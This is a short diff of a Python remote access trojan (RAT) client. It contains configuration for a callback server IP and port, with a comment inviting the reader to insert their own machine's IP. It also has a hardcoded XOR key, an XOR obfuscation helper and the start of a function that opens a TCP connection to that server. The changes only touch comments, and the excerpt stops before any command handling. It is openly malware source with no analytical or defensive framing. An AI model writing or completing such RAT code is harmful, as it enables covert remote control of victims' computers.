@@ -4,15 +4,15 @@ import socket
 import subprocess
 import random
 
-# --- CONFIGURATION ---
-server_ip = '10.18.2.31' 
+#  CONFIGURATION FOR RAT
+server_ip = '10.18.2.31' # Change this to your machine IP 
 port = 9999
 ENCRYPTION_KEY = b'secretkey'
 
 def xor_crypt(data, key):
     return bytes([b ^ key[i % len(key)] for i, b in enumerate(data)])
 
-# --- RAT CONNECTION LOGIC ---
+# RAT CONNECTIOn LOGIC 
 def connect_to_server():
     try:
         client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
